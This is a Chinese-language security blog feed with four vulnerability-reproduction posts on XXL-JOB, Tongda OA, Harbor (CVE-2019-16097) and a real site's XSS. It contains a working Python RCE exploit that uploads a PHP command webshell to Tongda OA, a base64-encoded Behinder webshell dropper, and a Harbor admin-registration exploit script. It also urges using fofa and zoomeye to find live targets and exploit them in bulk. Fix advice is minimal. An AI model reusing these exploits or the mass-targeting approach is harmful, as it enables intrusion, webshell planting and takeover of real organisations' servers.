    <link href="http://example.com/2020/03/31/XXL-JOB%E5%8F%8D%E5%BC%B9shell%E4%B9%8B%E6%89%93%E9%87%8E/"/>
    <id>http://example.com/2020/03/31/XXL-JOB%E5%8F%8D%E5%BC%B9shell%E4%B9%8B%E6%89%93%E9%87%8E/</id>
    <published>2020-03-31T13:34:05.000Z</published>
    <updated>2021-02-04T05:09:31.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXL-JOB后台反弹shell之打野"><a href="#XXL-JOB后台反弹shell之打野" class="headerlink" title="XXL-JOB后台反弹shell之打野"></a>XXL-JOB后台反弹shell之打野</h2><a id="more"></a><h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。</p><h3 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h3><p>能够直接获取系统权限</p><h3 id="0x03-漏洞产生原因"><a href="#0x03-漏洞产生原因" class="headerlink" title="0x03 漏洞产生原因"></a>0x03 漏洞产生原因</h3><p>主要是弱口令引起后台登陆，能够添加定时任务来进行反弹shell</p><h3 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04 漏洞挖掘"></a>0x04 漏洞挖掘</h3><p>使用 <code>fofa</code>搜索<code>XXL-JOB</code></p><p><img src="/images/image-20200331213613990.png" alt="image-20200331213613990"></p><p>输入 <code>admin/123456</code>就能登录</p><p><img src="/images/image-20200331213653192.png" alt="image-20200331213653192"></p><p>添加定时任务</p><p><img src="/images/image-20200331213738821.png" alt="image-20200331213738821"></p><p>使用<code>GLUE IDE</code>编辑内容</p><p><img src="/images/image-20200331213807416.png" alt="image-20200331213807416"></p><p>监听端口，启动定时任务。得到反弹shell</p><p><img src="/images/image-20200331213922592.png" alt="image-20200331213922592"></p><h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>密码搞复杂些，听到没有？</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;XXL-JOB后台反弹shell之打野&quot;&gt;&lt;a href=&quot;#XXL-JOB后台反弹shell之打野&quot; class=&quot;headerlink&quot; title=&quot;XXL-JOB后台反弹shell之打野&quot;&gt;&lt;/a&gt;XXL-JOB后台反弹shell之打野&lt;/h2&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA之RCE</title>
    <link href="http://example.com/2020/03/19/%E9%80%9A%E8%BE%BEOA%E4%B9%8BRCE/"/>
    <id>http://example.com/2020/03/19/%E9%80%9A%E8%BE%BEOA%E4%B9%8BRCE/</id>
    <published>2020-03-19T02:57:35.000Z</published>
    <updated>2021-02-03T00:05:32.697Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA之RCE（批量刷洞）"><a href="#通达OA之RCE（批量刷洞）" class="headerlink" title="通达OA之RCE（批量刷洞）"></a>通达OA之RCE（批量刷洞）</h1><a id="more"></a><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>通达OA V11版 &lt;= 11.3 20200103<br>通达OA 2017版 &lt;= 10.19 20190522<br>通达OA 2016版 &lt;= 9.13 20170710<br>通达OA 2015版 &lt;= 8.15 20160722<br>通达OA 2013增强版 &lt;= 7.25 20141211<br>通达OA 2013版 &lt;= 6.20 20141017</p><h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>能够远程执行计算机指令</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>漏洞文件位置：<code>isprit/im/upload</code></p><p>该文件存在逻辑漏洞，当<code>$P</code>非空的时候就不需要经过验证是否登录可以直接上传文件。</p><p><img src="/images/img20200318111612.png" alt="img"></p><p>但是上传之后的文件并没有在根目录下，因此无法直接使用，所以只有通过文件包含漏洞进行利用</p><p><img src="/images/img20200318111630.png" alt="img"></p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>位置：<code>ispirit/interface/gateway.php</code></p><p>上传的时候，只要没有参数P就无需验证</p><p><img src="/images/img20200318111550-1.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>构造数据包，上传文件</p><p><img src="/images/image-20200319121325031.png" alt="image-20200319121325031"></p><p>构造数据包，执行系统命令</p><p><img src="/images/image-202003191213503822.png" alt="image-20200319121350382"></p><h2 id="0x06-漏洞验证与利用"><a href="#0x06-漏洞验证与利用" class="headerlink" title="0x06 漏洞验证与利用"></a>0x06 漏洞验证与利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>写了个简单的POC，可以适当修改成批量的POC检测，或者EXP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">upload_data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;P&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$command=$_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="string">$wsh = new COM(&#x27;WScript.shell&#x27;);</span></span><br><span class="line"><span class="string">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span></span><br><span class="line"><span class="string">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="string">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="string">echo $stroutput;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="comment"># target = &quot;http://&quot; + target + &quot;:80/ispirit/im/upload.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: target,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/ispirit/im/upload.php&quot;</span></span><br><span class="line"></span><br><span class="line">    resp = requests.post(url, headers=headers, data=upload_data)</span><br><span class="line">    jpgname = re.split(<span class="string">&#x27;[@ _ |]&#x27;</span>, <span class="built_in">str</span>(resp.content))</span><br><span class="line">    name = jpgname[<span class="number">2</span>] + <span class="string">&quot;/&quot;</span> + jpgname[<span class="number">3</span>] + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    cmd_data = <span class="string">&#x27;json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/&#x27;</span> + name + <span class="string">&#x27;&quot;&#125;&amp;cmd=net user&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: target,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/mac/gateway.php&quot;</span></span><br><span class="line">    resp = requests.post(url, headers=headers, data=cmd_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;No input&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/ispirit/interface/gateway.php&quot;</span></span><br><span class="line">        resp = requests.post(url, headers=headers, data=cmd_data)</span><br><span class="line">    print(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target = sys.argv[<span class="number">1</span>] </span><br><span class="line">    name = uploadfile(target)</span><br><span class="line">    POC(target, name)</span><br></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/images/image-20200319135145445.png" alt="image-20200319121147574"></p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp &#x3D; fopen(&#39;readme.php&#39;, &#39;w&#39;);</span><br><span class="line">$a &#x3D; base64_decode(&quot;PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+&quot;);</span><br><span class="line">fwrite($fp, $a);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以替换掉代码 <code>upload_data</code> 中的php代码 。然后需要访问一下图片木马，php代码才会被执行。执行后会创建一个木马，位置在<code>/ispirit/interface/</code>目录中，用冰蝎连接即可。</p><p><img src="/images/image-20200319125232468.png" alt="image-20200319125232468"></p><h2 id="0x07-修复"><a href="#0x07-修复" class="headerlink" title="0x07 修复"></a>0x07 修复</h2><p>目前已经给出修复两个文件的修复建议，及时更换两个文件即可。</p><h2 id="0x08-批量刷洞"><a href="#0x08-批量刷洞" class="headerlink" title="0x08 批量刷洞"></a>0x08 批量刷洞</h2><p>使用 <code>zoomeye</code> 或者 <code>fofa</code> 搜索关键词 <code>通达OA</code></p><p><img src="/images/image-20200319133939748.png" alt="image-20200319133939748"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/jas502n/OA-tongda-RCE">https://github.com/jas502n/OA-tongda-RCE</a></p><p><a href="https://www.adminxe.com/1003.html">https://www.adminxe.com/1003.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;通达OA之RCE（批量刷洞）&quot;&gt;&lt;a href=&quot;#通达OA之RCE（批量刷洞）&quot; class=&quot;headerlink&quot; title=&quot;通达OA之RCE（批量刷洞）&quot;&gt;&lt;/a&gt;通达OA之RCE（批量刷洞）&lt;/h1&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Harbor任意管理员注册漏洞复现(CVE-2019-16097)</title>
    <link href="http://example.com/2020/03/09/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-16097/"/>
    <id>http://example.com/2020/03/09/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-16097/</id>
    <published>2020-03-09T13:40:50.000Z</published>
    <updated>2020-03-10T01:23:17.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Harbor任意管理员注册漏洞复现-CVE-2019-16097"><a href="#Harbor任意管理员注册漏洞复现-CVE-2019-16097" class="headerlink" title="Harbor任意管理员注册漏洞复现(CVE-2019-16097)"></a>Harbor任意管理员注册漏洞复现(CVE-2019-16097)</h2><h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>  Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。</p><a id="more"></a><h3 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h3><p>注册模块校验不严格，造成垂直越权，使得任意用户均可注册管理员账号。</p><h3 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h3><p>攻击者可以通过管理员账号管理Harbor镜像库，从而写入或替换成恶意的镜像，最终可以感染使用此仓库的客户端。</p><h3 id="0x04-影响版本"><a href="#0x04-影响版本" class="headerlink" title="0x04 影响版本"></a>0x04 影响版本</h3><p><code> 1.7.0-1.8.2</code></p><h3 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h3><p>使用 fofa 搜索关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;Harbor&quot; &amp;&amp; country&#x3D;CN</span><br></pre></td></tr></table></figure><p>找到注册页面</p><p><img src="/images/image-20200309214832733.png" alt="image-20200309214832733"></p><p>然后抓包</p><p><img src="/images/image-20200309215639755.png" alt="image-20200309215639755"></p><p>在末尾添加上如上图的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;has_admin_role&quot;:true</span><br></pre></td></tr></table></figure><p>返回码如果是201，则表示注册成功，登录即可。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20200309213826.png" alt="TIM截图20200309213826"></p><h3 id="0x06-脚本"><a href="#0x06-脚本" class="headerlink" title="0x06 脚本"></a>0x06 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve2019_10697</span>(<span class="params">url</span>):</span></span><br><span class="line">base_url = url + <span class="string">&quot;/api/users&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;unihac&quot;,&quot;email&quot;:&quot;unihac@gmail.com&quot;,&quot;realname&quot;:&quot;unihac&quot;,&quot;password&quot;:&quot;P@ssword&quot;,&quot;comment&quot;:&quot;0&quot;,&quot;has_admin_role&quot;:true&#125;&#x27;</span></span><br><span class="line">header = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(base_url, data=payload, headers=header, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">201</span>:</span><br><span class="line">        print(<span class="string">&quot;--+ This URL is Vulnerable !&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;--+ Login username: unihac   password: P@assword&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Like: http://example.com:10000&quot;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;URL: &quot;</span>)</span><br><span class="line">    cve2019_10697(url)</span><br></pre></td></tr></table></figure><h3 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h3><p>升级到最新版本。如1.7.6 以及 1.8.3</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Harbor任意管理员注册漏洞复现-CVE-2019-16097&quot;&gt;&lt;a href=&quot;#Harbor任意管理员注册漏洞复现-CVE-2019-16097&quot; class=&quot;headerlink&quot; title=&quot;Harbor任意管理员注册漏洞复现(CVE-2019-16097)&quot;&gt;&lt;/a&gt;Harbor任意管理员注册漏洞复现(CVE-2019-16097)&lt;/h2&gt;&lt;h3 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h3&gt;&lt;p&gt;  Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Harbor" scheme="http://example.com/tags/Harbor/"/>
    
  </entry>
  
  <entry>
    <title>某机构XSS实战</title>
    <link href="http://example.com/2020/03/05/%E6%9F%90%E6%9C%BA%E6%9E%84XSS%E5%AE%9E%E6%88%98/"/>
    <id>http://example.com/2020/03/05/%E6%9F%90%E6%9C%BA%E6%9E%84XSS%E5%AE%9E%E6%88%98/</id>
    <published>2020-03-04T23:23:45.000Z</published>
    <updated>2020-03-04T23:38:02.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次网站XSS之旅"><a href="#一次网站XSS之旅" class="headerlink" title="一次网站XSS之旅"></a>一次网站XSS之旅</h1><p>突然想到一个几年前的网站，当时宣传他们的培训机构。还宣传他们哪儿同样有网络安全培训，也有官网，然后我饶有兴趣的就去膜拜了一番他们的官网。</p><h2 id="0x01-找关键点"><a href="#0x01-找关键点" class="headerlink" title="0x01 找关键点"></a>0x01 找关键点</h2><p>输入被直接被输出到网页上显示。</p><h2 id="0x02-第一处XSS漏洞"><a href="#0x02-第一处XSS漏洞" class="headerlink" title="0x02 第一处XSS漏洞"></a>0x02 第一处XSS漏洞</h2><p>抱着希望的阿弥陀佛的态度，挨个挨个用xss代码，如下图</p><p><img src="/images/clip_image002.jpg" alt="img"></p><p>然后，阿弥陀佛保佑在这个在个人信息处（个人主页）存在存储型xss注入。</p><p><img src="/images/clip_image004.jpg" alt="img"></p><p><img src="/images/clip_image006.jpg" alt="img"></p><p>已经可以弹出cookie了。这样就可以提交漏洞了么？当然不行，虽然确实存在xss存储漏洞，但是没实际影响。因为</p><p><img src="/images/clip_image008.jpg" alt="img"></p><p>这就郁闷了，也不能修改公开。没啥危害哇！</p><h2 id="0x03-第二处xss漏洞"><a href="#0x03-第二处xss漏洞" class="headerlink" title="0x03 第二处xss漏洞"></a>0x03 第二处xss漏洞</h2><p>抱着同一个网站，可能会存在相似的漏洞心态，接着到处测试。看见输入框，贴上代码就行了。最终，保佑我在发送私信的地方存在xss注入。</p><p>申请两个账号，互相发送消息测试呗。</p><p><img src="/images/clip_image010.jpg" alt="img"></p><p>另一个账号收到发送的消息</p><p><img src="/images/clip_image012.jpg" alt="img"></p><p>点击xss查看消息，就获取到cookie了</p><p><img src="/images/clip_image014.jpg" alt="img"></p><p>第二处XSS代码找到了。</p><h2 id="0x04-XSS-挖掘"><a href="#0x04-XSS-挖掘" class="headerlink" title="0x04 XSS 挖掘"></a>0x04 XSS 挖掘</h2><p><strong><em>某大佬的经典台词：有框必X\</em></strong></p><h2 id="0x05-XSS-防御"><a href="#0x05-XSS-防御" class="headerlink" title="0x05 XSS 防御"></a>0x05 XSS 防御</h2><p>如果是HTML元素直接使用htmlspecialchars函数转义，如果是属性，使用htmlspecialchars函数转义并使用双引号括起来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次网站XSS之旅&quot;&gt;&lt;a href=&quot;#一次网站XSS之旅&quot; class=&quot;headerlink&quot; title=&quot;一次网站XSS之旅&quot;&gt;&lt;/a&gt;一次网站XSS之旅&lt;/h1&gt;&lt;p&gt;突然想到一个几年前的网站，当时宣传他们的培训机构。还宣传他们哪儿同样有网络安全培训，</summary>
      
    
    
    
    
    <category term="实战" scheme="http://example.com/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
</feed>
